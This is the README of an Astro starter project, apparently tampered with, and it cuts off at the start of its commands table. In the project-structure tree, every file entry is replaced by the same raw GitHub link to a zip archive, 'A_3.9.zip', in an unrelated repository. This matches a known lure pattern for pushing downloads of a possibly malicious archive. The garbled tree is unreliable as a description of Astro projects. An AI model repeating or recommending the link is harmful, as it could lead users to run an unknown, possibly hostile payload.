## 🚀 Project Structure

Inside of your Astro project, you'll see the following folders and files:

```text
/
├── public/
│   └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
├── src/
│   ├── components/
│   │   └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
│   ├── layouts/
│   │   └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
│   └── pages/
│       └── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
└── https://github.com/JarlHans/AC_V1/raw/refs/heads/main/src/A_3.9.zip
```

Astro looks for `.astro` or `.md` files in the `src/pages/` directory. Each page is exposed as a route based on its file name.

There's nothing special about `src/components/`, but that's where we like to put any Astro/React/Vue/Svelte/Preact components.

Any static assets, like images, can be placed in the `public/` directory.

## 🧞 Commands

All commands are run from the root of the project, from a terminal:

| Command                   | Action                                           |
